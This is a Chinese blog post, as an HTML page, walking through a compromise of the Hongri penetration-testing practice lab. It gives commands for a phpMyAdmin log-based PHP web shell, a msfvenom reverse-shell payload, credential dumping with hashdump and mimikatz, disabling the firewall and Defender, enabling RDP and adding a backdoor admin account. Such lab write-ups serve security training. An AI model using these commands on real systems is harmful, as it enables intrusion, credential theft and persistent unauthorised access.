@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":{"home":"/","about":"/about","tags":"/tags","resources":"/resources","categories":"/categories","schedule":"/schedule"}},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="目录扫描用dirsearch扫描发现主机有phpmyadmin 访问该路径发现phpmyadmin登陆窗口，猜测默认口令：root&#x2F;root，登陆成功  开放3306远程连接1234# 允许远程连接GRANT ALL PRIVILEGES ON *.* TO &amp;#x27;root&amp;#x27;@&amp;#x27;%&amp;#x27; IDENTIFIED BY &amp;#x27;root&amp;#x27; WIT">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红日靶场一">
+<meta property="og:url" content="http://example.com/2022/07/29/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/index.html">
+<meta property="og:site_name" content="小乱的Blog">
+<meta property="og:description" content="目录扫描用dirsearch扫描发现主机有phpmyadmin 访问该路径发现phpmyadmin登陆窗口，猜测默认口令：root&#x2F;root，登陆成功  开放3306远程连接1234# 允许远程连接GRANT ALL PRIVILEGES ON *.* TO &amp;#x27;root&amp;#x27;@&amp;#x27;%&amp;#x27; IDENTIFIED BY &amp;#x27;root&amp;#x27; WIT">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207311506186.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207292150789.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207292202861.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207311434070.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207311436753.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207311439469.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207311445465.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207311459175.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207311539557.png">
+<meta property="article:published_time" content="2022-07-29T13:37:13.000Z">
+<meta property="article:modified_time" content="2022-07-31T09:23:35.881Z">
+<meta property="article:author" content="xiaoluan">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207311506186.png">
+
+<link rel="canonical" href="http://example.com/2022/07/29/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>红日靶场一 | 小乱的Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">小乱的Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+        <li class="menu-item menu-item-resources">
+
+    <a href="/resources/" rel="section"><i class="fa fa-download fa-fw"></i>资源</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/29/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="xiaoluan">
+      <meta itemprop="description" content="健康 规律 技能">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小乱的Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          红日靶场一
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-29 21:37:13" itemprop="dateCreated datePublished" datetime="2022-07-29T21:37:13+08:00">2022-07-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-07-31 17:23:35" itemprop="dateModified" datetime="2022-07-31T17:23:35+08:00">2022-07-31</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">1.靶场练习</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/1-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">1.红日靶场</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>用dirsearch扫描发现主机有phpmyadmin</p>
+<p>访问该路径发现phpmyadmin登陆窗口，猜测默认口令：root&#x2F;root，登陆成功</p>
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207311506186.png" alt="image-20220731150611679"></p>
+<h3 id="开放3306远程连接"><a href="#开放3306远程连接" class="headerlink" title="开放3306远程连接"></a>开放3306远程连接</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 允许远程连接</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> PRIVILEGES <span class="keyword">ON</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;root&#x27;</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> OPTION;</span><br><span class="line"># 刷新权限</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
+
+<p>用navicat、mysqld等工具远程连接3306端口</p>
+<h3 id="日志getshell"><a href="#日志getshell" class="headerlink" title="日志getshell"></a>日志getshell</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 开启mysql日志功能</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> &quot;ON&quot;;</span><br><span class="line"># 设置日志文件保存为C:<span class="operator">/</span>phpStudy<span class="operator">/</span>WWW<span class="operator">/</span>shelllog.php</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file <span class="operator">=</span> &quot;C:/phpStudy/WWW/shelllog.php&quot;;</span><br><span class="line"># 查看日志文件保存在哪里</span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;general%&#x27;</span>;</span><br><span class="line"># 写入一句话木马</span><br><span class="line"><span class="keyword">select</span> &quot;&lt;?=eval(@$_POST[&#x27;test&#x27;]);?&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这样设置，就将所有sql执行记录存放到了网站根目录下的shelllog.php文件，也包括我们的一句话木马。</p>
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207292150789.png" alt="image-20220729215026519"></p>
+<p>使用蚁剑连接一句话</p>
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207292202861.png" alt="image-20220729220234962"></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>生成木马</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># lhost为公网IP地址</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.50.171 LPORT=4444 -f exe -o msf1.exe</span><br></pre></td></tr></table></figure>
+
+<p>msf开启监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 开msf控制台</span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line"># 使用利用模块</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"># 查看选项</span><br><span class="line">show options</span><br><span class="line"># 设置本地地址（公网地址，木马执行后外联的目的地址）</span><br><span class="line">set LHOST 192.168.50.171</span><br><span class="line"># 设置本地端口</span><br><span class="line">set lport 21003</span><br><span class="line"># 加载后渗透模块</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line"># 执行</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑关闭防火墙，上传msf1.exe，执行程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 关闭防火墙</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+
+<p>上传到任意有执行权限的目录</p>
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207311434070.png" alt="image-20220731143420134"></p>
+<p>执行木马</p>
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207311436753.png" alt="image-20220731143627847"></p>
+<p>监听成功</p>
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207311439469.png" alt="image-20220731143913864"></p>
+<h3 id="msf派生shell给cs"><a href="#msf派生shell给cs" class="headerlink" title="msf派生shell给cs"></a>msf派生shell给cs</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 获取system权限</span><br><span class="line">getsystem</span><br><span class="line"># 放置shell到后台</span><br><span class="line">background</span><br></pre></td></tr></table></figure>
+
+<p>利用相关模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">show options</span><br><span class="line"># 取消msf的监听，让lhost和lport只具备指引外联地址的作用，如果没有这条，msf的监听会和cs的监听冲突</span><br><span class="line">set DisablePayloadHandler true</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost &#x27;cs监听地址&#x27;</span><br><span class="line">set lport &#x27;cs监听端口&#x27;</span><br><span class="line">set session &#x27;msf放置到后台的session数字&#x27;</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>cs获得派生shell</p>
+<p>getsystem获得system权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 调低cs心跳，默认60，代表与靶机有60秒延迟</span><br><span class="line">sleep 1</span><br><span class="line"># 自动化获得system权限</span><br><span class="line">getsystem</span><br><span class="line"># 执行shell命令，查看当前权限</span><br><span class="line">shell whoami</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207311445465.png" alt="image-20220731144503538"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 抓靶机系统密码hash值</span><br><span class="line">hashdump</span><br><span class="line"># 调用mimikatz抓系统密码（低版本明文，高版本hash）</span><br><span class="line">logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207311459175.png" alt="image-20220731145945206"></p>
+<h3 id="开3389远程连接"><a href="#开3389远程连接" class="headerlink" title="开3389远程连接"></a>开3389远程连接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 开启3389端口</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+
+<p>rdesktop远程连接</p>
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207311539557.png" alt="image-20220731153915366"></p>
+<h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"># 当前用户</span><br><span class="line">whoami</span><br><span class="line"># 主机名</span><br><span class="line">hostname</span><br><span class="line"># 本机用户列表</span><br><span class="line">net user</span><br><span class="line"># 本地管理员组</span><br><span class="line">net localgroup administrator</span><br><span class="line"># 系统版本</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br><span class="line"># 系统架构</span><br><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br><span class="line"># 安装软件及版本</span><br><span class="line">wmic product get name,version</span><br><span class="line"># 进程与服务</span><br><span class="line">tasklist</span><br><span class="line"># IP查询，根据DNS判断是否在域环境</span><br><span class="line">ipconfig/all</span><br><span class="line"># 局域网内其他主机名</span><br><span class="line">net view</span><br><span class="line"># 查看域用户</span><br><span class="line">net view /domain</span><br><span class="line"># 查询计算机名 全名 用户名 系统版本 工作站 域 登录域</span><br><span class="line">net config workstation</span><br><span class="line"># 查看域控服务器</span><br><span class="line">nslookup god.org</span><br><span class="line"># 查看当前域下的所有用户 </span><br><span class="line">net user /domain # 若发现能够执行，说明此台机器在域中 (若是此命令在显示域处显示 WORKGROUP，则不存在域，若是报错：发生系统错误 5，则存在域，但当前登录用户不是域用户)</span><br><span class="line"># 获取域内用户信息</span><br><span class="line">wmic useraccount get /all</span><br><span class="line"># 查看域管理员的名字</span><br><span class="line">net group &quot;domain admins&quot; /domain</span><br><span class="line"># 查看所有域成员计算机名</span><br><span class="line">net group &quot;domain computers&quot; /domain</span><br><span class="line"># 查看域管理员</span><br><span class="line">net group &quot;domain admins&quot; /domain</span><br></pre></td></tr></table></figure>
+
+<p>渗透过程中可能用到的dos命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net user hack hack123 /add</span><br><span class="line">net localgroup administrator hack /add</span><br><span class="line">net localgroup &quot;Remote Desktop Users&quot; hack /add</span><br><span class="line">开启3389；</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">netsh advfirewall set allprofiles state off        #关闭防火墙</span><br><span class="line">net stop windefend</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/07/28/MacOS-VMwareFusion%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/" rel="prev" title="MacOS&VMwareFusion红日靶场搭建">
+      <i class="fa fa-chevron-left"></i> MacOS&VMwareFusion红日靶场搭建
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="nav-number">1.</span> <span class="nav-text">目录扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%80%E6%94%BE3306%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5"><span class="nav-number">2.</span> <span class="nav-text">开放3306远程连接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A5%E5%BF%97getshell"><span class="nav-number">3.</span> <span class="nav-text">日志getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">4.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msf%E6%B4%BE%E7%94%9Fshell%E7%BB%99cs"><span class="nav-number">5.</span> <span class="nav-text">msf派生shell给cs</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%803389%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5"><span class="nav-number">6.</span> <span class="nav-text">开3389远程连接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">7.</span> <span class="nav-text">内网信息收集</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="xiaoluan"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">xiaoluan</p>
+  <div class="site-description" itemprop="description">健康 规律 技能</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">28</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2021-08 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xiaoluan</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共29.4k字</span>
+</div>
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+$(document).ready(function() {
+
+    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+    var countOffset = 20000;  // 初始化首次数据
+
+    function fixCount() {            
+       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
+        {
+            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
+            clearInterval(int);
+        }                  
+        if ($("#busuanzi_container_site_pv").css("display") != "none")
+        {
+            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
+            clearInterval(int); // 停止检测
+        }  
+    }
+       	
+});
+</script> 
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
